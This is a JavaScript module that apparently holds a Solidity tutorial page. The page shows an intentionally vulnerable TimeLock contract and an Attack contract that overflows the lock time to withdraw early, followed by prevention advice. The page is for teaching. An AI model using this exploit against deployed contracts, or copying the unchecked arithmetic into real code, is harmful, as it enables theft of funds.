// metadata
export const version = "0.8.26"
export const title = "Arithmetic Overflow and Underflow"
export const description =
  "An example of hacking Solidity with arithmetic overflow / underflow"
export const cyfrinLink =
  "https://www.cyfrin.io/glossary/arithmetic-overflow-and-underflow-hack-solidity-code-example"

export const keywords = ["hack", "security", "arithmetic", "overflow", "underflow"]

export const codes = [
  {
    fileName: "Overflow.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuNy42OwoKLy8gVGhpcyBjb250cmFjdCBpcyBkZXNpZ25lZCB0byBhY3QgYXMgYSB0aW1lIHZhdWx0LgovLyBVc2VyIGNhbiBkZXBvc2l0IGludG8gdGhpcyBjb250cmFjdCBidXQgY2Fubm90IHdpdGhkcmF3IGZvciBhdCBsZWFzdCBhIHdlZWsuCi8vIFVzZXIgY2FuIGFsc28gZXh0ZW5kIHRoZSB3YWl0IHRpbWUgYmV5b25kIHRoZSAxIHdlZWsgd2FpdGluZyBwZXJpb2QuCgovKgoxLiBEZXBsb3kgVGltZUxvY2sKMi4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgVGltZUxvY2sKMy4gQ2FsbCBBdHRhY2suYXR0YWNrIHNlbmRpbmcgMSBldGhlci4gWW91IHdpbGwgaW1tZWRpYXRlbHkgYmUgYWJsZSB0bwogICB3aXRoZHJhdyB5b3VyIGV0aGVyLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIGNhdXNlZCB0aGUgVGltZUxvY2subG9ja1RpbWUgdG8gb3ZlcmZsb3cgYW5kIHdhcyBhYmxlIHRvIHdpdGhkcmF3CmJlZm9yZSB0aGUgMSB3ZWVrIHdhaXRpbmcgcGVyaW9kLgoqLwoKY29udHJhY3QgVGltZUxvY2sgewogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQyNTYpIHB1YmxpYyBiYWxhbmNlczsKICAgIG1hcHBpbmcoYWRkcmVzcyA9PiB1aW50MjU2KSBwdWJsaWMgbG9ja1RpbWU7CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdICs9IG1zZy52YWx1ZTsKICAgICAgICBsb2NrVGltZVttc2cuc2VuZGVyXSA9IGJsb2NrLnRpbWVzdGFtcCArIDEgd2Vla3M7CiAgICB9CgogICAgZnVuY3Rpb24gaW5jcmVhc2VMb2NrVGltZSh1aW50MjU2IF9zZWNvbmRzVG9JbmNyZWFzZSkgcHVibGljIHsKICAgICAgICBsb2NrVGltZVttc2cuc2VuZGVyXSArPSBfc2Vjb25kc1RvSW5jcmVhc2U7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUoYmFsYW5jZXNbbXNnLnNlbmRlcl0gPiAwLCAiSW5zdWZmaWNpZW50IGZ1bmRzIik7CiAgICAgICAgcmVxdWlyZShibG9jay50aW1lc3RhbXAgPiBsb2NrVGltZVttc2cuc2VuZGVyXSwgIkxvY2sgdGltZSBub3QgZXhwaXJlZCIpOwoKICAgICAgICB1aW50MjU2IGFtb3VudCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKCiAgICAgICAgKGJvb2wgc2VudCwpID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiBhbW91bnR9KCIiKTsKICAgICAgICByZXF1aXJlKHNlbnQsICJGYWlsZWQgdG8gc2VuZCBFdGhlciIpOwogICAgfQp9Cgpjb250cmFjdCBBdHRhY2sgewogICAgVGltZUxvY2sgdGltZUxvY2s7CgogICAgY29uc3RydWN0b3IoVGltZUxvY2sgX3RpbWVMb2NrKSB7CiAgICAgICAgdGltZUxvY2sgPSBUaW1lTG9jayhfdGltZUxvY2spOwogICAgfQoKICAgIGZhbGxiYWNrKCkgZXh0ZXJuYWwgcGF5YWJsZSB7fQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICB0aW1lTG9jay5kZXBvc2l0e3ZhbHVlOiBtc2cudmFsdWV9KCk7CiAgICAgICAgLyoKICAgICAgICBpZiB0ID0gY3VycmVudCBsb2NrIHRpbWUgdGhlbiB3ZSBuZWVkIHRvIGZpbmQgeCBzdWNoIHRoYXQKICAgICAgICB4ICsgdCA9IDIqKjI1NiA9IDAKICAgICAgICBzbyB4ID0gLXQKICAgICAgICAyKioyNTYgPSB0eXBlKHVpbnQpLm1heCArIDEKICAgICAgICBzbyB4ID0gdHlwZSh1aW50KS5tYXggKyAxIC0gdAogICAgICAgICovCiAgICAgICAgdGltZUxvY2suaW5jcmVhc2VMb2NrVGltZSgKICAgICAgICAgICAgdHlwZSh1aW50MjU2KS5tYXggKyAxIC0gdGltZUxvY2subG9ja1RpbWUoYWRkcmVzcyh0aGlzKSkKICAgICAgICApOwogICAgICAgIHRpbWVMb2NrLndpdGhkcmF3KCk7CiAgICB9Cn0K",
  },
]

const html = `<h3>Vulnerability</h3>
<h5>Solidity &lt; 0.8</h5>
<p>Integers in Solidity overflow / underflow without any errors</p>
<h5>Solidity &gt;= 0.8</h5>
<p>Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.7.6;</span>

<span class="hljs-comment">// This contract is designed to act as a time vault.</span>
<span class="hljs-comment">// User can deposit into this contract but cannot withdraw for at least a week.</span>
<span class="hljs-comment">// User can also extend the wait time beyond the 1 week waiting period.</span>

<span class="hljs-comment">/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">TimeLock</span> </span>{
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> balances;
    <span class="hljs-keyword">mapping</span>(<span class="hljs-keyword">address</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-keyword">uint256</span>) <span class="hljs-keyword">public</span> lockTime;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-literal">weeks</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">increaseLockTime</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _secondsToIncrease</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> _secondsToIncrease;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">&gt;</span> <span class="hljs-number">0</span>, <span class="hljs-string">"Insufficient funds"</span>);
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">block</span>.<span class="hljs-built_in">timestamp</span> <span class="hljs-operator">&gt;</span> lockTime[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>], <span class="hljs-string">"Lock time not expired"</span>);

        <span class="hljs-keyword">uint256</span> amount <span class="hljs-operator">=</span> balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        balances[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

        (<span class="hljs-keyword">bool</span> sent,) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    TimeLock timeLock;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">TimeLock _timeLock</span>) </span>{
        timeLock <span class="hljs-operator">=</span> TimeLock(_timeLock);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{}

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        timeLock.deposit{<span class="hljs-built_in">value</span>: <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>}();
        <span class="hljs-comment">/*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */</span>
        timeLock.increaseLockTime(
            <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span> <span class="hljs-operator">+</span> <span class="hljs-number">1</span> <span class="hljs-operator">-</span> timeLock.lockTime(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))
        );
        timeLock.withdraw();
    }
}
</code></pre><h3>Preventative Techniques</h3>
<ul>
<li><p>Use <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/utils/math/SafeMath.sol" target="__blank">SafeMath</a> to will prevent arithmetic overflow and underflow</p>
</li>
<li><p>Solidity 0.8 defaults to throwing an error for overflow / underflow</p>
</li>
</ul>
`

export default html
